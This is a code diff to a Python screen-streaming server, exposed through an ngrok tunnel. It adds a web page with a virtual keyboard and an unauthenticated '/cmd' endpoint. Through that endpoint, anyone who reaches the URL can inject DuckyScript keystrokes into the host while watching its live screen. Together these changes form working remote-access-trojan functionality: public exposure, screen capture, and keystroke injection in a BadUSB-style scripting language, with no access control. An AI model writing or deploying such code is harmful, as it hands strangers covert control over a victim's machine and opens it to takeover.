@@ -2,11 +2,13 @@ from io import BytesIO
 from pyngrok import ngrok
 from http.server import HTTPServer
 from socketserver import ThreadingMixIn
+from urllib.parse import urlparse, parse_qs
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 #Misc
 import numpy as np
 from threading import Thread
+from .duckyscript import toducky
 from pyautogui import screenshot
 from cv2 import cvtColor, resize, imencode, COLOR_BGR2RGB, VideoCapture
 
@@ -28,38 +30,173 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
         pass
 
 class ScreenStreamHandler(BaseHTTPRequestHandler):
+    def __init__(self, request, client_address, server):
+        self.action_table = {
+            "ducky": self.run_ducky
+        }
+        super().__init__(request, client_address, server)
+
+    def run_ducky(self, payload: str) -> None:
+        Thread(target=toducky, args=(payload, True)).start()
+
     def log_message(self, format, *args):
         pass
 
     def do_GET(self):
-        if self.path == '/':
+        parsed = urlparse(self.path)
+        if parsed.path == '/':
             html = b"""\
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>Screen Stream</title>
-                <style>
-                    body {
-                        background-color: #1e1e1e;
-                        color: #eee;
-                        font-family: sans-serif;
-                        text-align: center;
-                        padding-top: 30px;
-                    }
-                    img {
-                        border: 4px solid #444;
-                        border-radius: 10px;
-                        width: 80%%;
-                        max-width: 900px;
-                        box-shadow: 0 0 15px #000;
-                    }
-                </style>
-            </head>
-            <body>
-                <h1>Live Screen Stream</h1>
-                <img src="/video" alt="Screen stream">
-            </body>
-            </html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Screen Stream</title>
+    <meta charset="utf-8">
+
+    <style>
+        body {
+            background-color: #1e1e1e;
+            color: #eee;
+            font-family: sans-serif;
+            text-align: center;
+            padding-top: 20px;
+        }
+
+        img {
+            border: 4px solid #444;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 900px;
+            box-shadow: 0 0 15px #000;
+        }
+
+        #keyboard {
+            margin-top: 25px;
+            display: inline-block;
+            user-select: none;
+        }
+
+        .row {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 6px;
+        }
+
+        .key {
+            background: #333;
+            color: #eee;
+            border-radius: 6px;
+            width: 42px;
+            height: 42px;
+            line-height: 42px;
+            margin: 3px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .key:hover { background: #555; }
+
+        .wide { width: 90px; }
+        .xwide { width: 130px; }
+        .space { width: 260px; }
+
+        .active {
+            background: #777 !important;
+        }
+    </style>
+</head>
+
+<body>
+
+<h1>Live Screen Stream</h1>
+<img src="/video" alt="Screen stream">
+
+<div id="keyboard"></div>
+
+<script>
+let caps = false;
+let modifiers = [];
+
+function sendDucky(cmd) {
+    fetch("/cmd?action=ducky&payload=" + encodeURIComponent(cmd));
+}
+
+function pressKey(key) {
+    let ducky = "";
+
+    if (key === "CAPS") {
+        caps = !caps;
+        sendDucky("CAPSLOCK");
+        document.getElementById("caps").classList.toggle("active", caps);
+        return;
+    }
+
+    if (["CTRL","ALT","SHIFT","GUI"].includes(key)) {
+        if (modifiers.includes(key)) {
+            modifiers = modifiers.filter(k => k !== key);
+            sendDucky(key); // send standalone modifier if toggled off
+        } else {
+            modifiers.push(key);
+        }
+        document.getElementById(key).classList.toggle("active");
+        return;
+    }
+
+    if (modifiers.length) {
+        ducky = modifiers.join(" ") + " " + key;
+        modifiers.forEach(m => document.getElementById(m).classList.remove("active"));
+        modifiers = [];
+    } else if (key.length === 1) {
+        ducky = "STRING " + (caps ? key.toUpperCase() : key.toLowerCase());
+    } else {
+        ducky = key;
+    }
+
+    sendDucky(ducky);
+}
+
+const layout = [
+    ["ESC","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"],
+    ["`","1","2","3","4","5","6","7","8","9","0","-","=","BACKSPACE"],
+    ["TAB","Q","W","E","R","T","Y","U","I","O","P","[","]","\\\\"],
+    ["CAPS","A","S","D","F","G","H","J","K","L",";","'","ENTER"],
+    ["SHIFT","Z","X","C","V","B","N","M",",",".","/","SHIFT"],
+    ["CTRL","GUI","ALT","SPACE","ALT","GUI","CTRL"],
+    ["UP"],
+    ["LEFT","DOWN","RIGHT"]
+];
+
+const keyboard = document.getElementById("keyboard");
+
+layout.forEach(row => {
+    const rowDiv = document.createElement("div");
+    rowDiv.className = "row";
+
+    row.forEach(key => {
+        const k = document.createElement("div");
+        k.className = "key";
+        k.textContent = key;
+        k.onclick = () => pressKey(key);
+
+        if (["BACKSPACE","ENTER","SHIFT","CAPS","TAB"].includes(key))
+            k.classList.add("wide");
+
+        if (key === "SPACE")
+            k.classList.add("space");
+
+        if (key === "CAPS")
+            k.id = "caps";
+        if (["CTRL","ALT","SHIFT","GUI"].includes(key)) k.id = key;
+
+        rowDiv.appendChild(k);
+    });
+
+    keyboard.appendChild(rowDiv);
+});
+</script>
+
+</body>
+</html>
+
             """
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
@@ -67,7 +204,7 @@ class ScreenStreamHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(html)
 
-        elif self.path == '/video':
+        elif parsed.path == '/video':
             self.send_response(200)
             self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
             self.end_headers()
@@ -81,6 +218,21 @@ class ScreenStreamHandler(BaseHTTPRequestHandler):
                     self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
             except (BrokenPipeError, ConnectionResetError):
                 pass
+
+        elif parsed.path == '/cmd':
+            params = parse_qs(parsed.query)
+            action = params.get('action', [None])[0]
+            payload = params.get('payload', [""])[0]
+
+            if not(action in self.action_table):
+                self.send_error(400, "Invalid action")
+                return
+            fun = self.action_table[action]
+            fun(payload)
+
+            self.send_response(204)
+            self.end_headers()
+            return
 
         else:
             self.send_error(404)
